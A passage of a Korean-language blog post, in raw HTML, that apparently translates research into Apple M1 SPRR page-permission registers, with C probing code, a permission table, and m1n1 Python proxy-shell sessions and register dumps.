class="hljs-keyword">return</span> res;}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>{    (<span class="hljs-keyword">void</span>)argc;    (<span class="hljs-keyword">void</span>)argv;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span>    sigfillset(&amp;sa.sa_mask);    sa.sa_sigaction = bus_handler;    sa.sa_flags = SA_RESTART | SA_SIGINFO;    sigaction(SIGBUS, &amp;sa, <span class="hljs-number">0</span>);    sa.sa_sigaction = sev_handler;    sigaction(SIGSEGV, &amp;sa, <span class="hljs-number">0</span>);    <span class="hljs-keyword">uint32_t</span> *ptr = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);    write_sprr_perm(<span class="hljs-number">0x3333333333333333</span>);    ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0xd65f03c0</span>; <span class="hljs-comment">// ret</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)        sprr_test(ptr, make_sprr_val(i));}</code></pre></li></ul><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACB0;&#xACFC; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xC8FC;&#xC5B4;&#xC9C4;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>&#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;</th><th>&#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;</th></tr></thead><tbody><tr><td>00</td><td><code>---</code></td></tr><tr><td>01</td><td><code>r-x</code></td></tr><tr><td>10</td><td><code>r--</code></td></tr><tr><td>11</td><td><code>rw-</code></td></tr></tbody></table></div><p>APRR&#xC758; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xB2E8;&#xC21C;&#xD558;&#xB2E4;. &#xB450; &#xAC1C;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xCCAB; &#xAD8C;&#xD55C;&#xC744; &#xC124;&#xC815;&#xD558;&#xACE0; &#xB2E4;&#xB978; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xB9C8;&#xC2A4;&#xD0B9;&#xD558;&#xB294; &#xB300;&#xC2E0;&#xC5D0; 4&#xAC1C;&#xC758; &#xAC12; &#xC911; &#xD558;&#xB098;&#xB85C;&#xB9CC; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. APRR&#xC740; userspace&#xC5D0; <code>rxw</code> &#xB9E4;&#xD551;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xD574;&#xD0B9; &#xBC29;&#xBC95;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xB294;&#xB370;, &#xC774;&#xB97C; &#xC778;&#xCF54;&#xB529;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xB2E4;&#xB978; &#xBC14;&#xC774;&#xD2B8;&#xB4E4;&#xC740; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14; &#xC5D4;&#xD2B8;&#xB9AC;&#xC5D0; &#xC778;&#xCF54;&#xB529; &#xB41C; 16&#xAC1C;&#xC758; &#xB2E4;&#xB978; &#xC0AC;&#xC6A9; &#xAD8C;&#xD55C;&#xC77C; &#xC218;&#xB3C4; &#xC788;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xB098;&#xBA38;&#xC9C0;&#xB294; &#xC54C; &#xC218; &#xC5C6;&#xACA0;&#xB294;&#xAC78;</p><p>&#xC774;&#xC81C; &#xC0C8;&#xB85C;&#xC6B4; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAE30;&#xB2A5;&#xC758; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><p>&#xC560;&#xD50C;&#xC758; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; EL1&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; SPRR&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xC9C0;&#xB9CC;, SPRR&#xACFC; &#xC5F0;&#xAD00;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;. &#xB300;&#xC2E0;&#xC5D0; &#xBCA0;&#xC5B4; &#xBA54;&#xD0C8;(bare metal)&#xC744; &#xD1B5;&#xD574; EL2&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC790;.</p><h2 id="m1n1"><a href="#m1n1" class="headerlink" title="m1n1"></a>m1n1</h2><p>&#xC774;&#xC804; &#xC544;&#xC774;&#xD3F0; &#xD574;&#xCEE4;&#xB4E4;&#xC740; XNU&#xC744; &#xC815;&#xC801; &#xB9AC;&#xBC84;&#xC2F1; &#xD558;&#xAC70;&#xB098; exploit &#xD558;&#xAE30; &#xC704;&#xD574; EL1&#xAE4C;&#xC9C0; &#xAC00;&#xB294; &#xACFC;&#xC815;&#xC744; &#xC2E4;&#xD5D8;&#xD588;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; M1&#xC740; &#xB9CE;&#xC740; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAE30;&#xB2A5;&#xC744; &#xACF5;&#xC720;&#xD558;&#xBA70; &#xBD80;&#xD2B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>M1&#xC5D0; &#xB300;&#xD55C; upstream linux &#xC9C0;&#xC6D0;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xD558;&#xB294; Asahi Linux project&#xC758; &#xC77C;&#xBD80;&#xB85C; m1n1&#xC774;&#xB77C; &#xBD88;&#xB9AC;&#xB294; &#xC791;&#xC740; &#xBD80;&#xD2B8;&#xB85C;&#xB354;/&#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xD50C;&#xB7AB;&#xD3FC;&#xC774; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xB2E4;. m1n1&#xC740; XNU&#xC640; &#xB3D9;&#xC2DC;&#xC5D0; &#xC81C;&#xC5B4; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xB294;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC740; EL2&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; shellcode&#xB85C; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; m1n1&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC9C4;&#xD589;&#xD55C;&#xB2E4;.</p><h2 id="Python&#xC5D0;&#xC11C;-&#xC54C;-&#xC218;-&#xC5C6;&#xB294;-&#xC2DC;&#xC2A4;&#xD15C;-&#xB808;&#xC9C0;&#xC2A4;&#xD130;-&#xBC1C;&#xACAC;"><a href="#Python&#xC5D0;&#xC11C;-&#xC54C;-&#xC218;-&#xC5C6;&#xB294;-&#xC2DC;&#xC2A4;&#xD15C;-&#xB808;&#xC9C0;&#xC2A4;&#xD130;-&#xBC1C;&#xACAC;" class="headerlink" title="Python&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC1C;&#xACAC;"></a>Python&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC1C;&#xACAC;</h2><p>m1n1&#xC740; shellcode&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xACE0; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xB370;&#xC774;&#xD130; &#xCD94;&#xCD9C;&#xC744; &#xD578;&#xB4E4;&#xB9C1;&#xD558;&#xB294; &#xB4F1; &#xC774;&#xB7EC;&#xD55C; &#xBAA8;&#xB4E0; &#xC138;&#xBD80; &#xC0AC;&#xD56D;&#xC744; &#xD30C;&#xC774;&#xC36C; &#xC258;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB610; &#xCD5C;&#xADFC; &#xD544;&#xC790;&#xC758; USB &#xAC00;&#xC82F; &#xCF54;&#xB4DC;&#xB97C; &#xBCD1;&#xD569;&#xD558;&#xC5EC; m1 MAC&#xACFC; &#xC77C;&#xBC18; USB &#xCF00;&#xC774;&#xBE14;&#xB9CC;&#xC73C;&#xB85C; &#xD14C;&#xC2A4;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><code>proxyclient/shell.py</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC790;. &#xC720;&#xC800; &#xB79C;&#xB4DC; SPRR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC608;&#xC678;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))TTY&gt; Exception: SYNCTTY&gt; Exception taken <span class="hljs-keyword">from</span> EL2hTTY&gt; Running <span class="hljs-keyword">in</span> EL2TTY&gt; MPIDR: <span class="hljs-number">0x80000000</span>TTY&gt; Registers: (@<span class="hljs-number">0x8046b3db0</span>)TTY&gt;   x0-x3: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span>TTY&gt;   x4-x7: <span class="hljs-number">0000000810</span>cb8000 <span class="hljs-number">0000000000007</span>a69 <span class="hljs-number">0000000804630004</span> <span class="hljs-number">0000000804630000</span>TTY&gt;  x8-x11: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000000</span>ffffffc8 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">000000000000002</span>cTTY&gt; x12-x15: <span class="hljs-number">0000000000000003</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000008046</span>b3b20TTY&gt; x16-x19: <span class="hljs-number">00000008045</span>caa80 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">000000080462</span>b000TTY&gt; x20-x23: <span class="hljs-number">00000008046</span>b3f78 <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">0000000000000002</span> <span class="hljs-number">00000008046</span>b3f98TTY&gt; x24-x27: <span class="hljs-number">00000008046</span>b3f70 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000001</span>TTY&gt; x28-x30: <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">00000008045</span>bad90TTY&gt; PC:       <span class="hljs-number">0x810cb8000</span> (rel: <span class="hljs-number">0xc70c000</span>)TTY&gt; SP:       <span class="hljs-number">0x8046b3eb0</span>TTY&gt; SPSR_EL1: <span class="hljs-number">0x60000009</span>TTY&gt; FAR_EL1:  <span class="hljs-number">0x0</span>TTY&gt; ESR_EL1:  <span class="hljs-number">0x2000000</span> (unknown)TTY&gt; L2C_ERR_STS: <span class="hljs-number">0x11000ffc00000000</span>TTY&gt; L2C_ERR_ADR: <span class="hljs-number">0x0</span>TTY&gt; L2C_ERR_INF: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_LSU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_FED_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_MMU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; Recovering <span class="hljs-keyword">from</span> exception (ELR=<span class="hljs-number">0x810cb8004</span>)Traceback (most recent call last):  File <span class="hljs-string">&quot;/opt/homebrew/Cellar/python@3.9/3.9.4/Frameworks/Python.framework/Versions/3.9/lib/python3.9/code.py&quot;</span>, line <span class="hljs-number">90</span>, <span class="hljs-keyword">in</span> runcode    exec(code, self.locals)  File <span class="hljs-string">&quot;&lt;console&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;  File <span class="hljs-string">&quot;/Users/speter/asahi/git/m1n1/proxyclient/utils.py&quot;</span>, line <span class="hljs-number">80</span>, <span class="hljs-keyword">in</span> mrs    <span class="hljs-keyword">raise</span> ProxyError(<span class="hljs-string">&quot;Exception occurred&quot;</span>)proxy.ProxyError: Exception occurred&gt;&gt;&gt;</code></pre><p>&#xCEE4;&#xB110;&#xC740; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC804;&#xD658; &#xC911;&#xC5D0; &#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xB294; enable bit&#xAC00; &#xC788;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xBA70; m1n1 repository&#xC5D0; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xCC3E;&#xB294; &#xD30C;&#xC774;&#xC36C; &#xD234;&#xC774; &#xC788;&#xB2E4;. &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xBAA8;&#xB4E0; &#xBA85;&#xB839;&#xC5D0; &#xB300;&#xD574; mrs &#xBA85;&#xB839;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xC774;&#xD55C; &#xC608;&#xC678;&#xB97C; &#xBCF5;&#xAD6C;&#xD55C;&#xB2E4;. &#xADF8;&#xAC83;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xADFC;&#xCC98;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xCC3E;&#xB294;&#xB2E4;.</p><pre><code class="hljs python">$ python3 proxyclient/find_all_regs.py | grep s3_6_c15_c1_s3_6_c15_c1_0 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_2 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_4 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>) = <span class="hljs-number">0x0</span></code></pre><p>MMU&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xAC01; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xBAA8;&#xB4E0; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0;, &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xB2E4;&#xC2DC; &#xCC3E;&#xC544;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC2DD;&#xBCC4;&#xD55C;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xBA87; &#xC904;&#xC758; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">with</span> u.mmu_disabled():    <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> [(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)]:        old_regs = find_regs()        u.msr(reg, <span class="hljs-number">1</span>)        new_regs = find_regs()        diff_regs = new_regs - old_regs        print(reg)        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(diff_regs):            print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-number">0</span>)    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>)</code></pre><ul><li><p>&#xD65C;&#xC131;&#xD654;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;</p>  <pre><code class="hljs python">(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>](<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span 